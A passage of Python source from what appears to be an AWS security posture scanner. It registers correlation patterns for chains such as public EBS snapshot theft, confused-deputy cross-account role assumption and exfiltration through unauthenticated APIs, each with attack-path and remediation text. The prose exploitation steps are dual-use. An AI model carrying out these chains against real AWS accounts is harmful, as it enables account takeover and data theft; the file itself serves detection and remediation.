        severity="Critical",
        skills_required=["exposure", "iam"],
        matcher=_match_vulns_s3_ransomware_chain,
        attack_path_generator=_vulns_s3_ransomware_attack_path,
        remediation_generator=_vulns_s3_ransomware_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0040", "TA0005"],
            mitre_attack_techniques=["T1486", "T1485"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "Enumerate target buckets and recoverability controls",
                "Overwrite/encrypt/delete key objects at scale",
                "Disrupt restoration paths",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Medium",
            estimated_time_to_compromise="60 minutes",
        ),
        amplification_factor=1.85,
    )
)


def _match_vulns_public_snapshot_exfil_chain(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    vulns_findings = findings_by_skill.get("vulns", [])
    return any(f.id == "VULN-028" for f in vulns_findings)


def _vulns_public_snapshot_exfil_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker discovers public EBS snapshot IDs",
        "Creates volume from exposed snapshot and mounts data offline",
        "Extracts credentials, source code, and sensitive application artifacts",
    ]


def _vulns_public_snapshot_exfil_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Remove public createVolumePermission from all snapshots",
        "Continuously audit snapshot sharing posture across regions",
        "Rotate credentials potentially exposed through historical snapshots",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="vulns_public_ebs_snapshot_exfiltration_chain",
        name="Public EBS Snapshot Exfiltration Chain",
        description="Publicly shared EBS snapshots can expose full disk-level sensitive data.",
        severity="Critical",
        skills_required=["vulns"],
        matcher=_match_vulns_public_snapshot_exfil_chain,
        attack_path_generator=_vulns_public_snapshot_exfil_attack_path,
        remediation_generator=_vulns_public_snapshot_exfil_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0009", "TA0006"],
            mitre_attack_techniques=["T1537", "T1005"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "Locate snapshots with Group=all restore permission",
                "Create a volume from snapshot and attach to attacker-controlled instance",
                "Mount filesystem and extract sensitive data",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Low",
            estimated_time_to_compromise="25 minutes",
        ),
        amplification_factor=1.7,
    )
)


# ============================================================================
# NEW PATTERNS: Recon + GuardDuty + Egress + Cross-Account (8 patterns)
# ============================================================================


def _match_recon_apigw_unauth_to_data_exfil(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    """Recon detects unauthenticated API GW + Exposure detects sensitive data."""
    recon_findings = findings_by_skill.get("recon", [])
    exposure_findings = findings_by_skill.get("exposure", [])
    has_unauth_api = any(
        f.id in {"RECON-002", "RECON-014"} or "unauthenticated" in f.title.lower()
        for f in recon_findings
    )
    has_sensitive_data = any(
        f.id.startswith("EXP-") and f.severity in {"Critical", "High"}
        for f in exposure_findings
    )
    return has_unauth_api and has_sensitive_data


def _recon_apigw_unauth_exfil_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Recon phase identifies API Gateway endpoints without authentication",
        "Attacker enumerates routes using standard API fuzzing tools (ffuf, dirsearch)",
        "Unauthenticated routes invoke backend services accessing sensitive data",
        "Attacker exfiltrates data via unauthenticated API calls without credentials",
    ]


def _recon_apigw_unauth_exfil_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Enforce authentication on all API Gateway stages (Cognito, IAM, Lambda authorizer)",
        "Implement data-level authorization in backend services (never trust API layer alone)",
        "Enable API Gateway access logging and WAF with rate limiting",
        "Conduct periodic API endpoint inventory to detect unauthenticated routes",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="recon_apigw_unauth_to_data_exfil",
        name="Unauthenticated API Gateway to Data Exfiltration",
        description=(
            "Reconnaissance identified unauthenticated API Gateway endpoints backed by "
            "sensitive data stores. Attackers can invoke these endpoints without credentials "
            "to exfiltrate data directly."
        ),
        severity="Critical",
        skills_required=["recon", "exposure"],
        matcher=_match_recon_apigw_unauth_to_data_exfil,
        attack_path_generator=_recon_apigw_unauth_exfil_attack_path,
        remediation_generator=_recon_apigw_unauth_exfil_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0001", "TA0009"],
            mitre_attack_techniques=["T1190", "T1530"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "Enumerate API endpoints from Recon evidence or public documentation",
                "Test each endpoint without credentials (expect 401/403 vs 200/500)",
                "Invoke unauthenticated routes that return sensitive records",
                "Exfiltrate data via repeated API calls",
            ],
            tools_required=["curl", "ffuf", "aws-cli"],
            exploitation_complexity="Low",
            estimated_time_to_compromise="20 minutes",
        ),
        amplification_factor=1.9,
    )
)


def _match_cross_account_admin_no_externalid(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    """IAM-033 (cross-account without ExternalId) + role has Admin/PowerUser policy."""
    iam_findings = findings_by_skill.get("iam", [])
    has_cross_account_no_ext = any(f.id == "IAM-033" for f in iam_findings)
    has_admin_policy = any(
        f.id in {"IAM-015", "IAM-016"} or "administrator" in f.title.lower()
        for f in iam_findings
    )
    return has_cross_account_no_ext and has_admin_policy


def _cross_account_admin_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Identify cross-account trust without ExternalId requirement (IAM-033)",
        "Construct AssumeRole call from any AWS account (confused deputy attack)",
        "Gain access to Administrator-level role in target account",
        "Full account compromise: exfiltrate data, pivot to further accounts, persist access",
    ]


def _cross_account_admin_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Add ExternalId condition to all cross-account trust policies",
        "Remove AdministratorAccess from cross-account roles; apply least privilege",
        "Enable CloudTrail alerts for AssumeRole calls from unexpected accounts",
        "Review all cross-account trusts in IAM > Roles > Trust relationships",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="cross_account_admin_no_externalid",
        name="Cross-Account Admin Role Without ExternalId (Confused Deputy)",
        description=(
            "A cross-account IAM role with Administrator-level permissions lacks ExternalId "
            "protection. Any AWS account can assume this role via confused-deputy attack, "
            "gaining full administrative access to the account."
        ),
        severity="Critical",
        skills_required=["iam"],
        matcher=_match_cross_account_admin_no_externalid,
        attack_path_generator=_cross_account_admin_attack_path,
        remediation_generator=_cross_account_admin_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0001", "TA0004"],
            mitre_attack_techniques=["T1078", "T1548"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "Discover cross-account role ARN via public S3 buckets, code repos, or documentation",
                "Call sts:AssumeRole without ExternalId from attacker-controlled AWS account",
                "Receive temporary credentials with Administrator-level permissions",
                "Perform any action in the compromised account",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Low",
            estimated_time_to_compromise="5 minutes",
        ),
        amplification_factor=2.0,
    )
)


def _match_lambda_secrets_public_url_chain(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    """Lambda with secrets in env vars + public Function URL."""
    vulns_findings = findings_by_skill.get("vulns", [])
    recon_findings = findings_by_skill.get("recon", [])
    exposure_findings = findings_by_skill.get("exposure", [])
    has_lambda_secrets = any(
        f.id in {"VULN-024", "VULN-025"} or (
            "lambda" in f.title.lower() and "secret" in f.title.lower()
        )
        for f in vulns_findings
    )
    has_public_lambda_url = any(
        f.id == "RECON-005" or (
            "lambda" in f.title.lower() and "public" in f.title.lower()
        )
        for f in recon_findings + exposure_findings
    )
    return has_lambda_secrets and has_public_lambda_url


def _lambda_secrets_url_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Recon identifies Lambda Function URLs with AuthType=NONE (RECON-005)",
        "Attacker invokes public Lambda function and triggers SSRF via event payload",
        "Lambda reads AWS metadata or logs environment variables in error messages",
        "Attacker extracts AWS credentials or API keys from Lambda environment",
    ]


def _lambda_secrets_url_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Set Lambda Function URLs to AuthType=AWS_IAM (require SigV4 signing)",
        "Move secrets from environment variables to Secrets Manager with encrypted access",
        "Validate all Lambda event payloads to prevent SSRF via input manipulation",
        "Disable verbose error responses that expose environment details",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="lambda_secrets_public_url_chain",
        name="Public Lambda URL + Secrets in Environment Variables",
        description=(
            "A Lambda function with sensitive credentials in environment variables is "
            "publicly accessible via Function URL without authentication. Attackers can "
            "invoke the function to trigger SSRF or extract secrets from error messages."
        ),
        severity="Critical",
        skills_required=["vulns", "recon"],
        matcher=_match_lambda_secrets_public_url_chain,
        attack_path_generator=_lambda_secrets_url_attack_path,
        remediation_generator=_lambda_secrets_url_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0001", "TA0006"],
            mitre_attack_techniques=["T1190", "T1552"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "Identify public Lambda URLs from recon evidence",
                "Craft malicious event payload to trigger SSRF or verbose error",
                "Extract AWS credentials or API keys from response or logs",
                "Use credentials to escalate access or pivot to other services",
            ],
            tools_required=["curl"],
            exploitation_complexity="Medium",
            estimated_time_to_compromise="30 minutes",
        ),
        amplification_factor=1.85,
    )
)


def _match_compute_unrestricted_egress_exfil(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    """NET-EGR-001 (unrestricted egress) + Exposure has sensitive data."""
    network_findings = findings_by_skill.get("network", [])
    exposure_findings = findings_by_skill.get("exposure", [])
    has_unrestricted_egress = any(
        f.id == "NET-EGR-001" or "egress" in f.title.lower()
        for f in network_findings
    )
    has_sensitive_exposure = any(f.severity in {"Critical", "High"} for f in exposure_findings)
    return has_unrestricted_egress and has_sensitive_exposure


def _compute_unrestricted_egress_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker compromises compute instance (EC2, ECS, Lambda) via any vulnerability",
        "Unrestricted egress SG allows direct HTTPS connection to external attacker infrastructure",
        "Sensitive S3 data or database contents exfiltrated without triggering egress alerts",
        "Exfiltration blends with normal HTTPS traffic — no Network Firewall to inspect/block",
    ]


def _compute_unrestricted_egress_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Restrict egress security group rules: allow only specific ports/destinations",
        "Deploy AWS Network Firewall or DNS Firewall for outbound traffic inspection",
        "Enable VPC Flow Logs and create alerts for anomalous egress volume",
        "Use VPC endpoints to route AWS API calls privately without internet egress",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="compute_unrestricted_egress_exfil",
        name="Unrestricted Egress Enables Silent Data Exfiltration",
        description=(
            "Security groups allow all outbound traffic (0.0.0.0/0, all protocols). "
            "Combined with exposed sensitive data, a compromised compute instance can "
            "exfiltrate data directly to attacker infrastructure without detection."
        ),
        severity="High",
        skills_required=["network", "exposure"],
        matcher=_match_compute_unrestricted_egress_exfil,
        attack_path_generator=_compute_unrestricted_egress_attack_path,
        remediation_generator=_compute_unrestricted_egress_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0010", "TA0011"],
            mitre_attack_techniques=["T1048", "T1041"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "Compromise any compute resource via vulnerability or stolen credentials",
                "Establish outbound HTTPS channel to attacker-controlled server",
                "Download S3 objects, database dumps, or secrets to external destination",
            ],
            tools_required=["aws-cli", "curl"],
            exploitation_complexity="Low",
            estimated_time_to_compromise="15 minutes post-compromise",
        ),
        amplification_factor=1.6,
    )
)


def _match_guardduty_disabled_cover(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    """GuardDuty disabled (VULN-GD-001) and there are other high/critical findings."""
    vulns_findings = findings_by_skill.get("vulns", [])
    has_gd_disabled = any(f.id == "VULN-GD-001" for f in vulns_findings)
    if not has_gd_disabled:
        return False
    all_findings = [f for findings in findings_by_skill.values() for f in findings]
    other_high = sum(
        1 for f in all_findings
        if f.severity in {"Critical", "High"} and f.id != "VULN-GD-001"
    )
    return other_high >= 2


def _guardduty_disabled_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "GuardDuty is disabled — no behavioral threat detection active in account",
        "All other attack chains proceed silently without automated detection",
        "Attacker can operate for extended periods without triggering security alerts",
        "Standard AWS detection and response playbooks cannot activate without GuardDuty findings",
    ]


def _guardduty_disabled_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Enable GuardDuty in all regions immediately",
        "Enable enhanced data sources: S3 data events, EKS audit logs, Malware Protection",
        "Configure GuardDuty findings to EventBridge → SNS → PagerDuty/Slack",
        "Review historical CloudTrail logs for indicators of compromise during GuardDuty outage",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="guardduty_disabled_amplifies_all_attacks",
        name="GuardDuty Disabled — All Attacks Proceed Without Detection",
        description=(
            "GuardDuty is not enabled, removing the primary threat detection layer. "
            "All other vulnerabilities are amplified because attacks cannot be detected "
            "or attributed after the fact."
        ),
        severity="Critical",
        skills_required=["vulns"],
        matcher=_match_guardduty_disabled_cover,
        attack_path_generator=_guardduty_disabled_attack_path,
        remediation_generator=_guardduty_disabled_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0005", "TA0040"],
            mitre_attack_techniques=["T1562", "T1562.008"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "Verify GuardDuty is disabled (confirmed by VULN-GD-001 pre-check)",
                "Proceed with any attack chain — no behavioral detection will trigger",
                "Maintain access for extended periods without automated eviction",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Low",
            estimated_time_to_compromise="0 minutes (detection gap only)",
        ),
        amplification_factor=2.2,
    )
)


def _match_iam_no_mfa_cross_account_pivot(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    """IAM user without MFA + cross-account role without ExternalId."""
    iam_findings = findings_by_skill.get("iam", [])
    has_no_mfa = any(_is_no_mfa_finding(f) for f in iam_findings)
    has_cross_account = any(f.id == "IAM-033" for f in iam_findings)
    return has_no_mfa and has_cross_account


def _iam_no_mfa_cross_account_path(_: Dict[str, Any]) -> List[str]:
    return [
        "IAM user credentials stolen or brute-forced (no MFA protection)",
        "Attacker uses console access or API keys to enumerate IAM roles",
        "Discovers cross-account role without ExternalId requirement",
        "Assumes cross-account role → gains access to target account resources",
    ]


def _iam_no_mfa_cross_account_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Enable MFA for all IAM users with console access or active access keys",
        "Add ExternalId condition to all cross-account trust policies",
        "Enforce MFA with IAM condition: aws:MultiFactorAuthPresent=true on sensitive actions",
        "Implement AWS Organizations SCPs to block cross-account assumptions without MFA",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="iam_no_mfa_cross_account_pivot",
        name="IAM User Without MFA Enables Cross-Account Privilege Escalation",
        description=(
            "An IAM user lacks MFA protection and a cross-account role lacks ExternalId. "
            "Stolen credentials grant initial access, then the cross-account role enables "
            "pivot to additional AWS accounts."
        ),
        severity="Critical",
        skills_required=["iam"],
        matcher=_match_iam_no_mfa_cross_account_pivot,
        attack_path_generator=_iam_no_mfa_cross_account_path,
        remediation_generator=_iam_no_mfa_cross_account_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0001", "TA0008"],
            mitre_attack_techniques=["T1078", "T1548"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "Obtain IAM user credentials (phishing, leaked .env, S3 bucket exposure)",
                "Authenticate without MFA challenge to AWS console or CLI",
                "Call sts:AssumeRole on cross-account role without ExternalId",
                "Operate in target account with assumed role permissions",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Low",
            estimated_time_to_compromise="15 minutes",
        ),
        amplification_factor=1.95,
    )
)


def _match_recon_public_ip_no_firewall_lateral(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    """RECON-003 (Elastic IP with instance) + NET-007 (no Network Firewall)."""
    recon_findings = findings_by_skill.get("recon", [])
    network_findings = findings_by_skill.get("network", [])
    has_public_instance_ip = any(
        f.id == "RECON-003" or (
            "elastic" in f.title.lower() and "ip" in f.title.lower()
        )
        for f in recon_findings
    )
    has_no_firewall = any(
        f.id in {"NET-007", "NET-EGR-001"} or "firewall" in f.title.lower()
        for f in network_findings
    )
    return has_public_instance_ip and has_no_firewall


def _recon_public_ip_no_firewall_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Recon identifies EC2 instances with fixed public IPs (Elastic IPs)",
        "Internet traffic reaches instances directly without Network Firewall inspection",
        "Attacker exploits service vulnerability on public IP → initial access",
        "No east-west inspection: lateral movement to internal subnets proceeds undetected",
    ]


def _recon_public_ip_no_firewall_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Deploy AWS Network Firewall for north-south traffic inspection",
        "Replace Elastic IPs with ALB/NLB + Security Groups to restrict direct instance access",
        "Route internet traffic through inspection VPC before reaching application tier",
        "Enable VPC Flow Logs and Network Firewall logs for traffic visibility",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="recon_public_ip_no_firewall_lateral",
        name="Public EC2 IP Without Network Firewall Enables Lateral Movement",
        description=(
            "EC2 instances have Elastic IPs making them directly reachable from the internet, "
            "with no Network Firewall inspecting inbound traffic. Compromise leads to lateral "
            "movement through the internal network without inspection or blocking."
        ),
        severity="High",
        skills_required=["recon", "network"],
        matcher=_match_recon_public_ip_no_firewall_lateral,
        attack_path_generator=_recon_public_ip_no_firewall_path,
        remediation_generator=_recon_public_ip_no_firewall_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0001", "TA0008"],
            mitre_attack_techniques=["T1190", "T1021"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "Enumerate public IPs from Recon evidence or internet scanning",
                "Port-scan public IPs to identify exposed services",
                "Exploit vulnerable service to gain shell on EC2 instance",
                "Pivot to internal VPC resources using instance as jump host",
            ],
            tools_required=["nmap", "metasploit", "aws-cli"],
            exploitation_complexity="Medium",
            estimated_time_to_compromise="45 minutes",
        ),
        amplification_factor=1.7,
    )
)


def _match_snapshot_persistence_exfil(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    """EBS/RDS public snapshots + CVEs on instances."""
    exposure_findings = findings_by_skill.get("exposure", [])
    vulns_findings = findings_by_skill.get("vulns", [])
    has_public_snapshot = any(
        f.id in {"EXP-028", "EXP-029"} or "snapshot" in f.title.lower()
        for f in exposure_findings
    )
    has_public_ebs = any(f.id == "VULN-028" for f in vulns_findings)
    has_cves = any(
        f.id.startswith("VULN-") and "cve" in f.description.lower()
        for f in vulns_findings
    )
    return (has_public_snapshot or has_public_ebs) and has_cves


def _snapshot_persistence_exfil_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker discovers public EBS snapshot ID via AWS SDK enumeration",
        "Creates volume from snapshot in attacker-controlled AWS account",
        "Mounts volume to extract application data, database files, and credentials",
        "Uses extracted credentials to authenticate to live environment — persistent access",
    ]


def _snapshot_persistence_exfil_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Remove createVolumePermission Group=all from all EBS snapshots immediately",
        "Enable AWS Config rule: ec2-snapshot-public-restorable-check",
        "Rotate all credentials that may have been accessible from compromised snapshots",
        "Encrypt all EBS snapshots with customer-managed KMS keys",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="snapshot_persistence_exfil_chain",
        name="Public Snapshot + Active CVEs Enables Disk-Level Credential Theft",
        description=(
            "Publicly shared EBS snapshots expose full disk-level data to any AWS account. "
            "Combined with active CVEs on compute resources, attackers can extract credentials "
            "from snapshots and use them to authenticate to the live environment persistently."
        ),
        severity="Critical",
        skills_required=["exposure", "vulns"],
        matcher=_match_snapshot_persistence_exfil,
        attack_path_generator=_snapshot_persistence_exfil_path,
        remediation_generator=_snapshot_persistence_exfil_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0009", "TA0006"],
            mitre_attack_techniques=["T1537", "T1552"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "Search for public snapshots with Group=all permission",
                "Copy snapshot to attacker account and create volume",
                "Mount volume, extract credentials and application data",
                "Use credentials for persistent authenticated access to live environment",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Low",
            estimated_time_to_compromise="30 minutes",
        ),
        amplification_factor=1.9,
    )
)

